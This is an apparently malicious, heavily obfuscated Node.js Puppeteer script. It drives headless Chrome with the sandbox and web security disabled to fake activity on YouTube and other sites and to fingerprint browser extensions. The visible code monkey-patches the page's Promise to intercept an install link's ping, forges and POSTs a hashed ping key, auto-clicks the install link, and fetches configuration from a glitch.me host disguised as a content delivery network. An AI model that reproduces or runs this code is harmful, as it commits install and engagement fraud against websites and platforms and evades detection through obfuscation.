                J[0x10a6 + -0x201 + 0xe95 * -0x1] = this['block'], J[K >> 0xafb + 0x1c18 + -0x89 * 0x49] |= x[0x6fb * 0x2 + -0x7 * -0x43f + 0x15d6 * -0x2 & K], this['block'] = J[-0x8d * -0x3b + -0x9f0 + -0x167f], K >= -0xa6 * -0x23 + -0xc14 + -0xa66 && (this['hashed'] || this['hash'](), J[-0x22a1 + -0x60f * 0x1 + 0x28b0] = this['block'], J[-0x2d * -0x92 + -0x1 * 0xb4b + -0x1 * 0xe4f] = J[0xbca * 0x2 + 0x24b2 + -0x3c45] = J[-0x5 * 0x46c + 0x5 * -0x445 + -0x1 * -0x2b77] = J[0xb9f + 0x1475 * -0x1 + 0x8d9] = J[0x1 * 0x1f67 + -0x1 * 0x1346 + -0xc1d * 0x1] = J[-0x2f * -0x84 + -0x3a * 0x63 + -0x1c9] = J[0xb9e * 0x2 + 0xb8e * -0x2 + -0x1a * 0x1] = J[-0x1f2e + -0x107b * 0x2 + 0x1 * 0x402b] = J[-0x1 * 0x1d3 + -0x71f + 0x1 * 0x8fa] = J[0x17b * 0x8 + 0xd33 + -0x1902] = J[0x7c9 + 0x1 * -0xe3c + 0x67d] = J[0x1691 + 0xb0f + -0x2195] = J[-0x1d2 + -0x4 * -0x20 + -0x15e * -0x1] = J[-0x4cf + -0x1042 + 0x151e] = J[-0xd * 0x27a + 0x1 * 0x1f46 + -0x32 * -0x5] = J[-0x2e * 0xb7 + 0x19c7 * -0x1 + 0x3ab8] = 0xb * 0x1cd + -0x10b1 * 0x2 + 0x19 * 0x8b), J[-0x7 * -0x10b + 0x1 * -0x5ab + 0x65 * -0x4] = this['hBytes'] << -0xc * 0x2a1 + -0x1 * 0xb0 + -0x27b * -0xd | this['bytes'] >>> 0xb * 0x273 + 0x961 + -0x2435, J[0xc58 + 0x7 * 0x36a + 0x1 * -0x242f] = this['bytes'] << -0x219a + 0x438 + -0x23 * -0xd7, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1629 + 0x18d6 + 0x3 * -0xfa5; J < -0x7 * -0x4e1 + -0x782 * -0x1 + 0x1 * -0x2959; ++J)
                K = Q[J - (-0x2570 + -0x1 * 0xc51 + 0x31c4)] ^ Q[J - (-0x175f + -0x1f * -0xb6 + 0x15d)] ^ Q[J - (0x15 * -0x10a + 0x10 * -0x3 + 0x1610)] ^ Q[J - (0x1665 + -0x232b + 0x35 * 0x3e)], Q[J] = K << -0x1ed * 0x10 + -0x5 * 0x61b + 0x3d58 | K >>> 0x159c + -0xdfa + -0x783;
              for (J = -0x198c + -0x52 * -0x5 + 0x17f2; J < 0x7 * -0x250 + -0xd3 * -0x1a + -0x295 * 0x2; J += -0x770 * -0x5 + -0x954 + -0x1bd7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x18da + 0x13aa + 0x535 | L >>> 0x1955 + 0x1 * -0x3b3 + 0x1 * -0x1587) + (M & N | ~M & O) + P + (-0x811735f5 + -0x3 * 0x80298a + -0xa * -0x161c379e) + Q[J] << -0x22d6 + 0x2fa * 0x8 + 0xb06 * 0x1) << -0x21 * 0xe3 + 0xc87 * 0x2 + 0x43a | P >>> -0x1 * 0x1a23 + -0x9 * -0x3ae + -0x6e0) + (L & (M = M << 0x57e + 0x19d8 + -0x1f38 | M >>> -0x19 * -0x11 + -0x1 * -0xb3b + -0xce2) | ~L & N) + O + (-0x1e31 * -0x52f46 + 0x2731721e + -0x693738eb) + Q[J + (0x95 * -0x25 + 0x25 * -0x38 + 0x1da2)] << -0xd07 + 0x1a7c + -0xd75 * 0x1) << -0x2 * 0x78f + -0x24ea + 0xd * 0x401 | O >>> -0x12be + -0x1 * -0x355 + 0xf84) + (P & (L = L << -0x1 * 0x3d1 + -0x1 * 0x1e1a + 0x2209 | L >>> -0x92b * 0x2 + -0x7ee * 0x3 + 0x1511 * 0x2) | ~P & M) + N + (0xa4de2ecd + 0xa6c41bfa + -0x7178627 * 0x22) + Q[J + (-0x3 * -0x882 + -0x1e10 + 0x48c)] << -0x1499 + -0x614 + 0x1aad) << 0x1 * 0x4af + 0x877 + -0xd21 | N >>> -0x55b + -0x1 * 0x24bb + 0x607 * 0x7) + (O & (P = P << 0x41c + -0xe * -0x8b + -0xb98 | P >>> -0x3 * -0xc0f + -0x2409 + 0x1 * -0x22) | ~O & L) + M + (0x512d * -0x233fb + 0x146f894b + 0xf8e87e6d) + Q[J + (-0xab1 + -0x7 * -0x4e2 + 0xbbd * -0x2)] << -0x259d * 0x1 + -0xa1f + 0x2fbc) << -0x4e1 * 0x7 + 0x247b + -0x24f | M >>> -0xbfd * -0x3 + 0x933 + -0x903 * 0x5) + (N & (O = O << 0xe * -0x217 + -0x1 * 0x2303 + 0x4063 | O >>> -0xe2d + 0x1e9d * -0x1 + 0x2ccc) | ~N & P) + L + (0x1200dd * 0x796 + -0xb11318f1 + -0x2 * -0x41818306) + Q[J + (0x7 * 0x14a + 0x6a * 0x43 + -0x24c0)] << 0x15c2 + -0x161f + 0x5d, N = N << 0x5 * 0x76 + -0x2290 + 0x2060 | N >>> 0x1 * 0x26af + -0x789 * 0x2 + -0x179b;
              for (; J < 0x52 * -0x29 + -0x1067 + 0x1db1 * 0x1; J += -0x2 * -0x834 + -0xaf * 0x2f + 0xfbe)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x817 + -0x5 * 0x4ac + 0x1f78 | L >>> -0x9c * -0x1 + -0xf3b + 0xeba) + (M ^ N ^ O) + P + (0x1 * -0x7a9fecd1 + -0x8b0d5105 + 0x269 * 0x9a90df) + Q[J] << 0xd * 0xc7 + -0x3 * -0x5c + -0x7 * 0x199) << 0x180d + -0x3f7 * -0x1 + -0x1bff | P >>> 0x4d5 * 0x2 + 0x25c9 + -0x2f58) + (L ^ (M = M << -0x1 * 0xb2b + 0xb38 + 0x1 * 0x11 | M >>> -0x23f9 + 0x25af + 0x2 * -0xda) ^ N) + O + (0xbbe2ba08 + 0xd078accd + -0x47605ecd * 0x4) + Q[J + (-0x92d + -0xeaf * 0x1 + 0x17dd)] << 0x29 + 0x76d + -0x796) << 0x44 * -0x89 + -0xd24 * 0x2 + -0x5b3 * -0xb | O >>> -0x5 * 0x677 + -0x81 * -0xd + 0x19e1) + (P ^ (L = L << -0xa * -0x2ae + -0xf5d + -0xb51 | L >>> -0x9b4 * -0x2 + 0x10 * 0xa3 + -0x1d96) ^ M) + N + (0x82f * -0x1957f9 + -0x857e5324 + 0x1c3bf2d7c) + Q[J + (0x733 + -0x1b2f * -0x1 + -0x2260)] << 0x28d * 0xa + 0x529 + -0x1eab) << -0x9 * -0x305 + -0x2523 + 0x9fb | N >>> 0x1d * 0x45 + -0x8ce + -0x14 * -0xe) + (O ^ (P = P << -0x356 + 0xd95 + -0xa21 | P >>> -0x1b8e + 0x589 + -0x1607 * -0x1) ^ L) + M + (-0x242bd3dc + 0x3edc1101 + 0x5429ae7c) + Q[J + (-0x2704 + 0x1f48 + -0x7bf * -0x1)] << 0x1 * -0x1cab + -0x8cc + -0x1a1 * -0x17) << 0x21ff + 0x975 * -0x3 + -0x5 * 0x11f | M >>> -0x421 * -0x7 + -0xa88 + -0x1244) + (N ^ (O = O << -0x1 * -0x2 + 0x1 * 0xeea + -0xece | O >>> 0x3 * -0xaed + 0x1c35 + 0x494) ^ P) + L + (0x155 * -0x359bb5 + 0xfeb977d * -0x9 + -0x53 * -0x3ec1485) + Q[J + (-0xa * -0xba + -0x1a00 + 0x12c0)] << 0x4e * 0x5d + 0x11e + -0x91 * 0x34, N = N << -0x1 * 0x2133 + 0x617 * -0x1 + -0x13b4 * -0x2 | N >>> 0x1 * 0x45a + -0x1145 + 0xced * 0x1;
              for (; J < -0x972 + 0xa * 0x115 + -0x124; J += -0x20d7 + -0xf4 + 0x21d0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x1c98 + 0x45b * 0x5 + -0x325a | L >>> 0x32e * -0x9 + 0x1 * -0x1b2f + 0x37e8) + (M & N | M & O | N & O) + P - (0x279e5 * 0x5965 + -0x8436979 + -0x773ce * 0xd72) + Q[J] << 0x1 * -0x1ab3 + 0x709 * 0x1 + -0x6 * -0x347) << 0x7d * 0x41 + 0x6d * -0x27 + -0xf1d | P >>> 0xb15 * 0x1 + -0xf43 * 0x2 + 0x138c) + (L & (M = M << 0x103a * -0x1 + -0x880 * 0x1 + 0xa * 0x27c | M >>> -0x7e3 + 0xc93 + -0x4ae) | L & N | M & N) + O - (0x24d11779 * -0x3 + 0x4f3f4c3f + -0x8f0 * -0x101f5b) + Q[J + (-0xe * 0x2a1 + 0x20a0 + -0x3 * -0x165)] << -0x2f * 0x73 + -0x855 * -0x3 + -0x3e2) << -0x14c8 + 0x1 * 0x18a2 + -0x9 * 0x6d | O >>> 0x9 * -0x18b + -0x3ff + 0x133 * 0xf) + (P & (L = L << -0x513 * 0x1 + 0x741 * 0x1 + 0xc * -0x2c | L >>> 0x1bb8 + 0x2 * 0x677 + 0x363 * -0xc) | P & M | L & M) + N - (-0xa20ae4ca + -0x3882879b + -0x3 * -0x6e7b3a83) + Q[J + (0x2264 + 0xaad * -0x2 + 0x2 * -0x684)] << 0x33 * -0x9 + 0x5 * 0x446 + -0x1393) << 0xc * -0xe2 + -0x18c7 + -0x5e6 * -0x6 | N >>> 0x2216 * -0x1 + 0x3 * 0x1f7 + 0xe26 * 0x2) + (O & (P = P << 0x12f8 + -0xd * -0x15b + 0x1 * -0x2479 | P >>> -0x5 * 0x65 + 0x3 * 0xaa2 + 0x14d * -0x17) | O & L | P & L) + M - (-0x9a432358 + 0x41bec * 0x2a35 + 0x2 * 0x2edc7350) + Q[J + (0x7 * -0x73 + -0x29 * 0xd7 + 0x1 * 0x2597)] << -0xc15 + 0x528 * -0x4 + 0x20b5) << -0x3b * 0x19 + -0x1 * 0x2a7 + 0x86f | M >>> 0x232f + 0x1 * -0x26cb + -0x3 * -0x13d) + (N & (O = O << 0x4df + 0x8 * 0x49c + -0x1 * 0x29a1 | O >>> -0x1 * -0x120a + 0x2124 + -0x332c) | N & P | O & P) + L - (0x96c165ac + 0x5a94c142 + -0x8071e3ca) + Q[J + (0x2e6 + -0x18f5 + 0x1613 * 0x1)] << -0x11 * -0x1af + 0x2472 + 0x1 * -0x4111, N = N << 0x1 * -0x868 + -0x1329 + 0x1baf | N >>> -0x24c1 + 0x1 * 0x10b1 + 0x1412;
              for (; J < -0x15d * -0x1 + 0xb39 + -0xc46; J += 0xee5 + -0xa7 * -0x2c + -0x2b94)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2324 + 0x7f3 + -0x2b12 | L >>> 0x12b7 + 0x1f38 + -0x31d4) + (M ^ N ^ O) + P - (-0x10fa774e + 0x56532f31 * -0x1 + 0x9ceae4a9) + Q[J] << -0xb60 + 0x1ad3 + -0xf73) << -0x2 * 0x135d + -0x19a1 + 0x8 * 0x80c | P >>> -0xeda + 0xb * 0x175 + -0x2 * 0x89) + (L ^ (M = M << 0x5 * -0x2b5 + -0x20d + 0x2 * 0x7da | M >>> 0x3 * -0x316 + 0xd79 * 0x1 + -0x435) ^ N) + O - (-0x55b8d740 + 0x676114aa + 0x23f500c0) + Q[J + (0x2 * 0x9a2 + 0x1 * -0x5b9 + -0xd8a)] << 0x2267 + -0x1 * -0x1ad8 + -0x3d3f) << 0xa64 + 0xb * 0x22d + -0x1 * 0x224e | O >>> -0x2237 + -0x93b + 0x2b8d) + (P ^ (L = L << -0x135 + -0x1367 * 0x2 + 0x1 * 0x2821 | L >>> 0x1 * 0x15cf + 0xf64 + -0x2531) ^ M) + N - (-0x4721fbee + -0x25498 * 0x10e1 + 0xa41513b0) + Q[J + (0x5e3 + 0x1216 + -0x17f7)] << -0x13c9 + 0x2b8 + 0x1111 * 0x1) << 0x8e1 * 0x4 + 0x15a6 + 0x1 * -0x3925 | N >>> 0x55 * 0x5b + 0x1719 + 0x3535 * -0x1) + (O ^ (P = P << -0x1a68 * 0x1 + -0x133e + 0x2dc4 | P >>> -0x5 * -0x4d6 + -0xebc + -0x970) ^ L) + M - (-0x3 * 0x1dc6ab8f + 0x3 * -0x1e878af0 + 0x1 * 0xea87e1a7) + Q[J + (0x769 + -0x8c8 + 0xb1 * 0x2)] << 0x177d + 0x24a3 * 0x1 + -0x3c20) << -0x2060 + 0x10a * 0x16 + 0x989 * 0x1 | M >>> -0xcc + 0x16ba + 0x25 * -0x97) + (N ^ (O = O << 0x3b * -0x8b + -0x49 * 0x3a + 0x3 * 0x103b | O >>> -0x1878 + 0x7d4 * 0x4 + 0x15e * -0x5) ^ P) + L - (0x18012efb + -0x5234e9df + 0x6fd0f90e) + Q[J + (-0x163 + -0x4b2 * 0x5 + -0xb * -0x243)] << -0x33 * -0xa6 + -0x1916 + -0x7 * 0x124, N = N << -0x31 * -0x73 + -0x14c6 + -0x1 * 0x11f | N >>> 0x26e9 + -0x157d + -0x116a;
              this['h0'] = this['h0'] + L << -0xdb4 * -0x1 + 0x7fd + -0x269 * 0x9, this['h1'] = this['h1'] + M << 0x16c9 + -0xf94 + -0xf * 0x7b, this['h2'] = this['h2'] + N << -0x1ccd + 0x16a8 + 0x625, this['h3'] = this['h3'] + O << 0xe * -0x16a + 0xd7f * 0x1 + -0x1 * -0x64d, this['h4'] = this['h4'] + P << -0x1f1d + 0x107d * -0x2 + 0x4017;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x379 + 0x103c + -0x1399 & 0xd * 0x2b6 + -0x5 * -0x2f2 + -0x31e9] + w[J >> 0x1401 * -0x1 + -0x25 * 0xe5 + -0x4d6 * -0xb & -0x5 * 0x793 + -0x1a86 * 0x1 + 0x4074] + w[J >> -0xa05 + 0x488 + 0x591 & 0x813 + 0xa75 * -0x2 + 0xce6] + w[J >> -0x2 * 0x95d + 0x1fdf + -0xd15 & -0x114 + 0x475 + -0x352] + w[J >> 0x2158 + -0x23c2 + 0x276 & 0xfe + 0x2e + -0x11d] + w[J >> 0x1 * 0xbe9 + 0xd1d + -0x18fe & 0x2319 + 0x1bca + -0x3ed4] + w[J >> -0x16d7 + 0x141 + 0x159a & 0x5f7 + 0xc19 * -0x1 + 0x631] + w[-0x2f7 * -0x1 + 0xae6 + -0xdce & J] + w[K >> -0x2465 * 0x1 + -0x1548 + 0x39c9 & -0xcc5 * -0x1 + -0x243b + 0x1785] + w[K >> 0x7f * 0x35 + -0x1 * 0x2f1 + 0x2 * -0xba1 & -0x33b * 0x6 + -0x3 * 0xad2 + -0x1 * -0x33e7] + w[K >> -0x1316 + 0x1894 + -0x2 * 0x2b5 & 0x3d * 0x5e + 0xa1 * -0x29 + -0x1 * -0x372] + w[K >> -0x2083 * 0x1 + 0x262 * -0x4 + 0x2a1b & -0xd3d + 0x1198 * 0x2 + -0x15e4] + w[K >> 0x694 + 0xe49 + -0x1 * 0x14d1 & -0x775 * -0x4 + 0x1 * 0xe29 + -0x2 * 0x15f7] + w[K >> -0x7a5 * 0x1 + -0xd * -0x287 + -0x192e & -0x1 * -0x171f + -0x23cc + 0x65e * 0x2] + w[K >> 0x29e + -0x1623 + -0x1389 * -0x1 & -0x1 * -0x171a + -0x192a + 0x21f] + w[0x159 * 0x3 + 0x1456 + -0x1852 & K] + w[L >> -0x1e9 * -0x1 + 0xdcb + -0x8 * 0x1f3 & 0x2142 + 0x1cb2 + -0x3de5] + w[L >> -0x2 * 0x6c9 + 0x1da0 + -0x12 * 0xe3 & -0x864 + -0x88b + 0x10fe] + w[L >> 0x1 * -0x15d4 + -0x2410 + 0x39f8 & 0x11 * -0xd3 + 0xe87 * 0x1 + -0x3 * 0x27] + w[L >> -0xe3 * 0x1 + 0x17c3 + -0x16d0 & 0xf1d + 0x3a * -0x11 + -0xb34] + w[L >> 0x2 * -0xc25 + -0x2c9 * -0xd + -0xbdf & 0x125 * -0x8 + -0x4 * -0x886 + -0x84b * 0x3] + w[L >> -0xc82 * -0x3 + 0x148b + -0x3a09 & -0xedf + -0x1806 + -0x1 * -0x26f4] + w[L >> 0x7d9 * -0x4 + 0x19eb + 0x119 * 0x5 & -0x20 * -0xbc + 0x8d + -0x4a * 0x53] + w[-0xdfd * 0x1 + 0x2097 + -0x2f * 0x65 & L] + w[M >> 0x259b * 0x1 + 0x168d + -0x3c0c & 0xfa * 0x14 + -0x235a + -0x1 * -0xfe1] + w[M >> 0x1931 + 0x1306 * -0x2 + 0xcf3 & -0x159b + 0x1bc0 + 0x1 * -0x616] + w[M >> 0x1c64 * 0x1 + -0x54a * -0x3 + -0x2c2e & 0x359 + 0x10 * -0xf9 + 0xc46] + w[M >> 0x152d + 0x215e + -0x367b & 0x216d + -0x35d + 0x1e01 * -0x1] + w[M >> 0x446 * -0x1 + 0x1 * 0x89b + 0x449 * -0x1 & 0xb9c + -0x144d * 0x1 + 0x8c0] + w[M >> -0x8 * -0x4b3 + -0xde0 + -0x17b0 & 0x2410 + 0x1b06 + 0x7 * -0x901] + w[M >> -0x2483 + -0x18ca + -0xb * -0x593 & 0xf35 * 0x1 + 0xf47 + -0x1e6d] + w[-0x9 * -0x3d2 + -0x1691 + 0x23 * -0x56 & M] + w[N >> -0x1fc1 + -0x1cae + 0x3c8b & 0x21cb + 0x1 * 0xbcb + -0x2d87] + w[N >> 0x164 * 0xa + 0x25c7 + -0x1 * 0x3397 & -0x24fd + -0x1 * 0x127d + 0x3789] + w[N >> -0xc73 + -0x4f * -0x65 + -0x12a4 & -0x191 + -0xa8b * 0x1 + 0xc2b] + w[N >> -0x1eff + 0x1 * 0x9f5 + -0x25 * -0x92 & -0x12 * 0xeb + 0x2e1 + -0x36d * -0x4] + w[N >> 0x191f + 0x1e2b + -0x373e & 0x19d7 + 0x6aa + -0x1039 * 0x2] + w[N >> -0x9 * 0x1cb + -0xa13 * 0x2 + 0x1 * 0x2451 & -0x1998 + 0x2 * -0x653 + -0x264d * -0x1] + w[N >> 0xb26 + 0x12e2 + -0x1e04 & -0x10e6 + 0x1 * 0x393 + 0xd62] + w[0x182d + -0x4a3 * -0x3 + -0x375 * 0xb & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x229e + 0x75a + -0xa * 0x430 & 0x360 + 0x1 * -0x655 + 0xb * 0x5c,
                J >> 0x2d9 + 0x1531 * -0x1 + 0x1268 & -0x2b4 + 0x17e * 0x7 + -0x9d * 0xb,
                J >> 0x35 * -0x19 + -0xfe * -0x1f + -0x198d & 0x20f8 + -0x6 * -0x2e6 + -0x315d,
                -0x3 * -0x277 + -0xe * 0x29b + 0x134 * 0x19 & J,
                K >> 0x1 * 0xa51 + 0x26e0 + -0x3119 & 0xdc3 + -0x1 * 0x1345 + -0x14d * -0x5,
                K >> 0x1ea8 + -0x1929 + -0x56f & -0x6f9 + -0x3ac * 0x3 + -0x3 * -0x654,
                K >> 0x1 * 0xaad + 0xd * -0x1db + 0x32 * 0x45 & 0xc7c + 0x76 * -0x4c + 0x1 * 0x178b,
                0x49 * -0x3 + 0x1 * 0xd39 + -0xb5f * 0x1 & K,
                L >> -0x813 + -0x189 * -0xe + -0xd53 & 0xab9 + 0x12f5 + 0x7 * -0x419,
                L >> 0x1dc4 + 0x59 * 0x4f + -0x392b & 0x202 + 0x9a6 + -0x1 * 0xaa9,
                L >> -0xb * -0x295 + -0x223f * -0x1 + -0x1ca * 0x23 & 0x1 * 0x6ee + 0x2c3 + -0x8b2,
                0x1686 + 0x51e + -0x13 * 0x167 & L,
                M >> -0x1206 + 0x1 * 0xcc8 + 0x556 & -0x14ec + -0xae5 * 0x2 + 0x2bb5 * 0x1,
                M >> -0x1 * 0x26ae + -0x2b * -0x9 + 0x253b & 0xa94 * -0x2 + 0x24c2 + -0xe9b,
                M >> 0xe53 + 0x16 * 0x81 + 0x59 * -0x49 & -0x1500 + 0x11ef + 0xa * 0x68,
                -0x2 * 0xd9 + -0x8d4 + -0x1 * -0xb85 & M,
                N >> 0xa99 + 0x5fb + -0x107c & 0x1410 + 0x3f8 + -0x1709,
                N >> -0x101f * 0x1 + 0x10e4 + 0x1 * -0xb5 & -0x303 * 0xc + 0x25f * -0xe + -0x569 * -0xd,
                N >> 0x2ba * -0x4 + 0x2 * 0xd8 + 0x94 * 0x10 & -0x28 * 0xfa + -0x1b8 + -0x5 * -0x85b,
                0x13 * -0x43 + 0x1f64 + -0x196c & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xb10 + 0x9 * 0x198 + -0x2 * 0xcaa), (K = new DataView(J))['setUint32'](0x19d * 0x11 + 0x1dc5 + -0x3932, this['h0']), K['setUint32'](0x1312 * 0x1 + -0x1 * 0x9c2 + -0x94c, this['h1']), K['setUint32'](0x2298 + -0x4b8 * -0x8 + -0x4850, this['h2']), K['setUint32'](-0x1 * 0x7f + -0x1e2d + 0x1eb8, this['h3']), K['setUint32'](-0x1 * 0x295 + -0x4e4 + 0x789 * 0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x17d3 + -0x1178 + 0x65b * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2690 + -0x1 * -0x1256 + 0x2 * -0x1c73;
            J[-0x14c2 * -0x1 + 0x1 * 0x109 + -0x7 * 0x31d]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x20b7 + -0x627 + 0x26de] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x231a + -0x49 * 0x86 + 0x31d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x172 + 0x5a8 + -0x719;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0xad + -0x43 * 0x59 + 0x1c7a), Promise['resolve'](0xb14 + -0x5 * 0x24a + -0x1 * -0x5f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1b14 + 0xdfa * 0x2 + -0x496 * 0xc; j < 0x239 + -0x3 * -0x58f + -0x2b3 * 0x7; j++)
    i();
}
const NETWORK_PATIENCE = -0x2045 * -0x1 + -0x1 * -0x22ff + -0x2404 + (-0xbb0 + -0x1 * -0x190f + -0x1a7) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1615 + 0x2e3 * -0x8 + 0x2d30) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x268b + 0x33 * -0xb5 + 0x4a9a);
    let h = e[f];
    if (c['PixyOL'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1446 + -0x1 * -0x22de + -0xe98, r, s, t = -0x12b5 + -0x1d5d * -0x1 + -0xaa8; s = m['charAt'](t++); ~s && (r = q % (-0xa8d + 0x1bd3 * -0x1 + -0x4e * -0x7e) ? r * (-0x3a7 + 0x4e6 + -0xff) + s : s, q++ % (-0x1646 + -0xb * 0x11 + -0x1 * -0x1705)) ? o += String['fromCharCode'](-0x2583 + 0xae7 * -0x1 + 0x3169 & r >> (-(0x2474 + 0x25c * 0x3 + 0x4d6 * -0x9) * q & -0x5 * 0x517 + -0x31e + -0xd * -0x233)) : 0x2144 + 0xc6f * 0x1 + -0x2db3 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x890 * 0x4 + 0x7d + -0x22bd * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xd20 + -0x1710 + 0x244 * 0x10))['slice'](-(-0x1506 + -0x130e + 0x2816));
        }
        return decodeURIComponent(p);
      };
      c['crGZeh'] = i, b = arguments, c['PixyOL'] = !![];
    }
    const j = e[0x2122 * -0x1 + -0x136 * -0x9 + 0x163c * 0x1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['crGZeh'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      V(0xf) + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x124e + -0x2495 * -0x1 + 0x36e3 * -0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function a() {
  const bl = [
    'EmkHafHzWOZdTIjszq',
    'lither-io-',
    'Ahr0Chm6lY9Tzq',
    'tK5duxqXCLHyrq',
    'WQekW5ZdJ3/cQCkEWQKxba',
    '-adblock-v',
    'WPPJpSoxuXRdQhvd',
    '/zyenith/M',
    'l37cLv/dP8kiWQ8PymkG',
    '\x20(KHTML,\x20l',
    'pLFdL8krWR4dC2ioW5i',
    'lwrVBMfSzc10CG',
    'evaluate',
    'W40IWP7dR2FdJ8osDwqJ',
    'e/surviv.i',
    'ls1KAxnHyMXLlq',
    'x3bOsfmZrKfNvW',
    'zgvVlwHPzgvYlq',
    'https://gr',
    'W53cICkOzsC',
    'WPVcLwjvWPagW7GjvWu',
    'hmkqW6NdGe1tzmo/WQddTG',
    'zgL1Bs5JB20Vqa',
    'gmoZvCkCWQRdNuTxpHG',
    'zM9YlxzLBNr1CG',
    'DgLVBIXIDhmGCW'
  ];
  a = function() {
    return bl;
  };
  return a();
}
